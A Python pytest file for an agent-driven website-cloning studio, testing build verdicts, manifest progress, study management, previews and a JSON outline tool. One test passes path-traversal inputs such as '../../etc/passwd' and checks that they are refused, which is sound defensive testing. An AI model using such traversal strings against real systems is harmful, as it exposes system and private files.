def run_final(project, scaffolded, previous=None):
    check = studio.CheckDef(id="final", kind="clone_build", params={"script": "check", "host": "example.com"})
    ctx = CheckContext(task="", outputs={"prepare": {"scaffolded": scaffolded}, **({"final": previous} if previous else {})}, ledger=[], history=[], definition=WorkflowDef(workflow=WorkflowMeta(id="x", name="x")),
                       workspace=project)
    return studio._clone_build(check, ctx)


def test_a_build_of_the_kits_own_blank_page_is_not_a_clone(passing_npm):
    result = run_final(passing_npm, scaffolded=28)
    assert result["passed"] is False and result["verdict"] == "NOTHING_WRITTEN" and result["built"] is True
    assert "holds nothing of the site" in result["summary"] and "skill" in result["summary"]


def test_a_component_of_the_site_a_page_of_another_route_or_a_changed_page_makes_it_a_clone(passing_npm):
    page = passing_npm / "src/app/page.tsx"
    page.write_text("export default function Page() { return <main>Slow roasted</main> }", encoding="utf-8")
    assert run_final(passing_npm, 28)["passed"] is True
    page.write_text("export default function Page() { return null }", encoding="utf-8")
    assert run_final(passing_npm, 28)["passed"] is False
    # An empty file named like the site's folder, which is what a model made trying to "create the folder", is not a component.
    (passing_npm / "src/components/sites").mkdir(parents=True)
    (passing_npm / "src/components/sites/example.com").write_text("", encoding="utf-8")
    assert run_final(passing_npm, 28)["passed"] is False
    (passing_npm / "src/components/sites/example.com").unlink()
    (passing_npm / "src/components/sites/example.com").mkdir()
    (passing_npm / "src/components/sites/example.com/Hero.tsx").write_text("export const Hero = () => <section>Slow roasted, fast to your door. Small-batch coffee from three farms.</section>", encoding="utf-8")
    assert run_final(passing_npm, 28)["passed"] is True
    (passing_npm / "src/components/sites/example.com/Hero.tsx").unlink()
    (passing_npm / "src/app/about").mkdir()
    (passing_npm / "src/app/about/page.tsx").write_text("export default function About() { return <main>About the roastery, three farms, one promise.</main> }", encoding="utf-8")
    assert run_final(passing_npm, 28)["passed"] is True


def test_a_project_of_the_persons_own_is_not_held_to_the_kits_page(passing_npm):
    assert run_final(passing_npm, scaffolded=0)["passed"] is True


def write_manifest(project, pages):
    (project / "docs/research").mkdir(parents=True, exist_ok=True)
    (project / "docs/research/manifest.json").write_text(json.dumps({"site": "https://example.com/", "pages": pages}), encoding="utf-8")


def test_a_build_is_not_done_while_the_kits_manifest_lists_sections_that_are_not_qa_passed(passing_npm):
    (passing_npm / "src/app/page.tsx").write_text("export default function Page() { return <main>Slow roasted</main> }", encoding="utf-8")
    write_manifest(passing_npm, [{"route": "/", "status": "in_progress", "sections": [
        {"name": "hero", "stage": "built"}, {"name": "cards", "stage": "qa_passed"}, {"name": "footer", "stage": "specd"}]}])
    result = run_final(passing_npm, 28)
    assert result["passed"] is False and result["verdict"] == "UNFINISHED" and result["built"] is True
    assert "/: hero (built)" in result["summary"] and "/: footer (specd)" in result["summary"] and "cards" not in result["summary"]
    assert "node scripts/manifest.mjs set --route <route> --section <name> --stage qa_passed" in result["summary"]
    # A page chosen but without any section yet is unfinished too.
    write_manifest(passing_npm, [{"route": "/about.html", "status": "pending", "sections": []}])
    assert "/about.html: no section yet" in run_final(passing_npm, 28)["summary"]
    # Everything qa_passed, or a page marked done: finished. A manifest that cannot be read is not held against the work.
    write_manifest(passing_npm, [{"route": "/", "status": "done", "sections": [{"name": "hero", "stage": "qa_passed"}]}])
    assert run_final(passing_npm, 28)["passed"] is True
    (passing_npm / "docs/research/manifest.json").write_text("{not json", encoding="utf-8")
    assert run_final(passing_npm, 28)["passed"] is True
    assert studio._unfinished(None) == []


# -- the studies ------------------------------------------------------------------------------------------------


def make_studio(db, tmp_path, runtime=None):
    manager = RunManager(db, runtime or FakeRuntime({"*": ["ok"]}), bus=EventBus(), checkpoint_path=":memory:")
    install = BrowserInstall(tmp_path / "engine", which=lambda name: None, bus=EventBus())
    return studio.CloneStudio(db, manager, fake_store(tmp_path / "kits"), install), manager


def test_where_the_project_goes_depends_on_the_folder(db, tmp_path):
    study, _ = make_studio(db, tmp_path)
    home = tmp_path / "home"
    assert study.target(None, "example-com", home) == home
    empty = tmp_path / "empty"
    empty.mkdir()
    assert study.target(str(empty), "example-com", home) == empty
    mine = tmp_path / "mine"
    mine.mkdir()
    fake_store(tmp_path / "kits").scaffold(mine)
    assert study.target(str(mine), "example-com", home) == mine
    busy = tmp_path / "busy"
    busy.mkdir()
    (busy / "notes.txt").write_text("mine", encoding="utf-8")
    assert study.target(str(busy), "example-com", home) == busy / "example-com"


def test_a_study_is_started_listed_read_served_and_deleted(db, tmp_path, monkeypatch):
    fake_checks(monkeypatch, [True])
    runtime = FakeRuntime({"Cloner": [tool_call("write_file", path="docs/research/example.com/screenshots/home-desktop.png", content="png?"),
                                      tool_call("write_file", path="docs/research/example.com/screenshots/home-desktop-review.png", content="png?"), "Done."]})
    study, manager = make_studio(db, tmp_path, runtime)
    entry, record = study.start("example.com", model_key="m", sees=False, language="it", extra="only the home page")
    manager.wait(record.id, 30)
    detail = study.get(entry["id"])
    assert detail["url"] == "https://example.com" and detail["host"] == "example.com" and detail["slug"] == "example-com"
    assert detail["runs"][0]["status"] == "completed" and detail["ask"] is None and detail["project"] is True
    task = detail["runs"][0]["task"]
    assert "scrivi le risposte e fai le domande in italiano" in task and "only the home page" in task
    # The full-size picture is left out when it has a -review twin: the page shows the small one.
    assert detail["shots"] == ["docs/research/example.com/screenshots/home-desktop-review.png"]
    assert study.list()[0]["thumbnail"] == detail["shots"][0]
    assert study.file(entry["id"], detail["shots"][0]).name == "home-desktop-review.png"
    for outside in ("../../etc/passwd", "package.json", "docs/missing.png"):
        with pytest.raises(studio.CloneError):
            study.file(entry["id"], outside)
    assert db.kv_get("run_definition", record.id)["workflow"]["id"] == "clone-site"
    again, second = study.start("", model_key="m", sees=False, study_id=entry["id"], extra="the footer is missing")
    manager.wait(second.id, 30)
    assert again["workspace"] == entry["workspace"] and "Improve the clone of https://example.com" in manager.get(second.id).task
    assert len(study.get(entry["id"])["runs"]) == 2
    study.delete(entry["id"])
    assert study.list() == [] and not Path(entry["workspace"]).exists()
    with pytest.raises(studio.CloneError):
        study.get(entry["id"])


def test_a_question_that_waits_is_part_of_the_study_and_can_be_answered(db, tmp_path, monkeypatch):
    fake_checks(monkeypatch, [True])
    install = BrowserInstall(tmp_path / "engine", which=lambda name: None, bus=EventBus())
    registry = SessionRegistry(install)
    runtime = FakeRuntime({"Cloner": [tool_call("ask_user", question="Which pages?", options=["Only the home page"]), "Done."]})
    manager = RunManager(db, runtime, bus=EventBus(), checkpoint_path=":memory:", clone_session=registry.session)
    study = studio.CloneStudio(db, manager, fake_store(tmp_path / "kits"), install)
    entry, record = study.start("example.com", model_key="m", sees=False)
    for _ in range(200):
        if study.get(entry["id"])["ask"]:
            break
        time.sleep(0.05)
    detail = study.get(entry["id"])
    assert detail["ask"] == {"question": "Which pages?", "options": ["Only the home page"]} and detail["ask_run"] == record.id and detail["active"] is True
    assert study.answer(entry["id"], "Only the home page") is True
    for _ in range(200):  # the tool that was waiting takes the answer and clears the question a moment later
        if not study.get(entry["id"])["ask"]:
            break
        time.sleep(0.05)
    assert study.answer(entry["id"], "again") is False
    manager.wait(record.id, 30)
    assert manager.get(record.id).status == "completed" and study.get(entry["id"])["ask"] is None
    with pytest.raises(studio.CloneError):
        study.answer("nope", "x")


def test_a_folder_of_the_person_is_never_deleted_with_its_clone(db, tmp_path, monkeypatch):
    fake_checks(monkeypatch, [True])
    mine = tmp_path / "mine"
    mine.mkdir()
    study, manager = make_studio(db, tmp_path)
    entry, record = study.start("example.com", model_key="m", sees=False, workspace=str(mine))
    manager.wait(record.id, 30)
    study.delete(entry["id"])
    assert mine.is_dir()


def test_a_clone_does_not_start_when_the_kit_cannot_be_fetched(db, tmp_path):
    def offline(args, cwd, timeout):
        return subprocess.CompletedProcess(args, 128, "", "fatal: Could not resolve host: github.com")

    manager = RunManager(db, FakeRuntime({"*": ["ok"]}), bus=EventBus(), checkpoint_path=":memory:")
    install = BrowserInstall(tmp_path / "engine", which=lambda name: None, bus=EventBus())
    study = studio.CloneStudio(db, manager, KitStore(tmp_path / "kits", git=offline), install)
    with pytest.raises(studio.CloneError, match="Could not resolve host"):
        study.start("example.com", model_key="m", sees=False)
    assert study.list() == [] and not manager.list()


def test_a_bad_address_is_refused(db, tmp_path):
    study, _ = make_studio(db, tmp_path)
    with pytest.raises(studio.CloneError, match="not the address"):
        study.start("hello", model_key="m", sees=False)


def test_the_clone_opens_in_the_browser_at_an_address_the_app_may_open(db, tmp_path, monkeypatch):
    """The app's link opener only allows http://127.0.0.1:<port>/<path>: an address without a path was refused."""
    fake_checks(monkeypatch, [True])
    study, manager = make_studio(db, tmp_path)
    study.install = BrowserInstall(tmp_path / "engine", which=lambda name: "C:/npm.cmd", bus=EventBus())

    class Server:
        def __init__(self, folder, npm):
            self.folder = folder

        def start(self):
            return "http://127.0.0.1:5000"

    monkeypatch.setattr(studio, "DevServer", Server)
    entry, record = study.start("example.com", model_key="m", sees=False)
    manager.wait(record.id, 30)
    assert study.preview(entry["id"]) == "http://127.0.0.1:5000/"


def test_the_kit_is_described_for_the_interface(tmp_path):
    described = fake_store(tmp_path).describe()
    assert described["license"] == "MIT" and described["commit"] == KIT.commit[:12] and described["ready"] is True and described["author"] == "Mahanaicoach"
    assert json.dumps(described)


def test_tools_are_registered_and_listed_for_the_editor():
    names = {t["name"] for t in base.tool_catalog()}
    assert set(tools.BROWSER_TOOLS) | set(tools.PROJECT_TOOLS) | {"download_asset", "look"} <= names
    assert base.TOOLS["browser_navigate"].group == "Browser" and base.TOOLS["run_command"].group == "Project"


def test_another_pass_is_asked_for_only_while_the_work_moves(passing_npm):
    (passing_npm / "src/app/page.tsx").write_text("export default function Page() { return <main>Slow roasted</main> }", encoding="utf-8")
    write_manifest(passing_npm, [{"route": "/", "status": "in_progress", "sections": [{"name": "hero", "stage": "specd"}, {"name": "cards", "stage": "discovered"}]}])
    first = run_final(passing_npm, 28)
    assert first["passed"] is False and first["should_continue"] is True
    assert first["progress"]["stage:specd"] == 1 and first["progress"]["stage:discovered"] == 1 and first["progress"]["source_files"] == 1
    # The agent changed nothing in a whole pass: the same pass again would be a waste.
    assert run_final(passing_npm, 28, previous=first)["should_continue"] is False
    # A section moved on, or a spec or a component was written: it is worth another pass.
    write_manifest(passing_npm, [{"route": "/", "status": "in_progress", "sections": [{"name": "hero", "stage": "built"}, {"name": "cards", "stage": "discovered"}]}])
    assert run_final(passing_npm, 28, previous=first)["should_continue"] is True
    moved = run_final(passing_npm, 28)
    (passing_npm / "docs/research/components").mkdir(parents=True)
    (passing_npm / "docs/research/components/cards.spec.md").write_text("# cards", encoding="utf-8")
    assert run_final(passing_npm, 28, previous=moved)["should_continue"] is True
    write_manifest(passing_npm, [{"route": "/", "status": "done", "sections": [{"name": "hero", "stage": "qa_passed"}]}])
    done = run_final(passing_npm, 28, previous=moved)
    assert done["passed"] is True and done["should_continue"] is False


def test_a_run_goes_through_several_passes_while_the_work_moves_and_ends_blocked_when_it_stops(db, tmp_path, monkeypatch):
    fake_checks(monkeypatch, [False])
    runtime = FakeRuntime({"Cloner": ["pass one", "pass two", "pass three"]})
    _, record = start_clone(db, tmp_path, runtime)
    # The fake check says the work moved after the first pass only: two passes, then the run ends blocked with the reason.
    assert record.result["history"] == ["prepare", "cloner", "final", "cloner", "final"] and record.status == "blocked"


# -- json_outline: a big JSON file in a few lines --------------------------------------------------------------------

BIG = {"colors": {"ink": "#111", "paper": "#fff", **{f"c{i}": f"#{i:06x}" for i in range(60)}},
       "fonts": [{"family": "Roboto", "src": ["a.woff2", "b.woff2"], "weight": 400}, {"family": "Romain Headline", "src": ["c.woff"], "weight": 700}]
       + [{"family": f"F{i}"} for i in range(10)], "note": "x" * 400, "n": 3, "empty": [], "log": [f"entry number {i}" for i in range(300)]}


def outline(tmp_path, **args):
    (tmp_path / "docs").mkdir(exist_ok=True)
    (tmp_path / "docs" / "tokens.json").write_text(json.dumps(BIG), encoding="utf-8")
    return base.execute("json_outline", {"path": "docs/tokens.json", **args}, ToolContext(workspace=tmp_path))


def test_an_outline_shows_the_shape_not_the_whole_file(tmp_path):
    text = outline(tmp_path)
    assert text.startswith("docs/tokens.json /: object, 6 keys: colors, fonts, note, n, empty, log")
    assert "fonts: array, 12 items (dict) with keys: family, src, weight" in text and "[0]: object, 3 keys: family, src, weight" in text
    assert "... and 9 more items" in text and "... and 22 more keys" in text  # 62 colours, 40 shown
    assert "... (400 characters)" in text and "empty: array, 0 items (empty)" in text and "n: 3" in text
    assert "... and 297 more items" in text and len(text) < 3700
    assert text.endswith("(a pointer to a part under 3000 characters shows all of it)")


def test_a_pointer_goes_into_one_part_in_either_syntax_and_a_wrong_one_says_what_is_there(tmp_path):
    for pointer in ("/fonts/1", "fonts.1"):
        text = outline(tmp_path, pointer=pointer)
        assert text.startswith("docs/tokens.json /fonts/1 (all of it): ") and '"Romain Headline"' in text and '"c.woff"' in text
    assert outline(tmp_path, pointer="/fonts/0/src", depth=0) == 'docs/tokens.json /fonts/0/src (all of it): ["a.woff2", "b.woff2"]'
    with pytest.raises(ToolError, match=r"Nothing called 'colour' at /\. There: colors, fonts, note, n, empty, log"):
        outline(tmp_path, pointer="/colour")
    with pytest.raises(ToolError, match="use a number from 0 to 11"):
        outline(tmp_path, pointer="/fonts/x")


def test_a_part_under_three_thousand_characters_is_shown_whole_with_every_value(tmp_path):
    """Seen on a 27B (brioni.com): the outline of 8 colours showed the first, and it asked for /colors/3, /colors/4, ... one call each."""
    text = outline(tmp_path, pointer="/fonts")
    assert text.startswith("docs/tokens.json /fonts (all of it): [") and '"F9"' in text and '"Romain Headline"' in text and "..." not in text
    colors = outline(tmp_path, pointer="/colors")
    assert colors.startswith("docs/tokens.json /colors (all of it): {") and '"c59": "#00003b"' in colors
    assert json.loads(colors.split(": ", 1)[1]) == BIG["colors"]
    assert outline(tmp_path, pointer="/note").startswith("docs/tokens.json /note: ")  # a string is not a part
    # A part over the limit is outlined, and the answer says how to see a smaller part whole.
    big = outline(tmp_path, pointer="/log")
    assert big.startswith("docs/tokens.json /log: array, 300 items (str)") and "(all of it)" not in big and "shows all of it" in big


def test_an_outline_refuses_what_is_not_json_or_not_in_the_project(tmp_path):
    ctx = ToolContext(workspace=tmp_path)
    (tmp_path / "notes.json").write_text("{not json", encoding="utf-8")
    with pytest.raises(ToolError, match="not valid JSON"):
        base.execute("json_outline", {"path": "notes.json"}, ctx)
    with pytest.raises(ToolError, match="File not found"):
        base.execute("json_outline", {"path": "missing.json"}, ctx)
    with pytest.raises(ToolError, match="outside the workspace"):
        base.execute("json_outline", {"path": "../escape.json"}, ctx)


def test_the_agent_is_told_how_small_its_memory_is_and_what_to_use_instead_of_paging(tmp_path):
    text = prompts.skill_prompt(fake_store(tmp_path), url="https://example.com", host="example.com", sees=False)
    assert "Your working memory is small" in text and "`json_outline`" in text and "docs/research/example.com/NOTES.md" in text
    assert "reading is not progress" in text and "takes your reading tools away" in text
    # The first build error of a 27B on brioni.com: `import { localFont } from "next/font"` and paths from the site's root.
    assert 'import localFont from "next/font/local"' in text and "relative to the layout file" in text
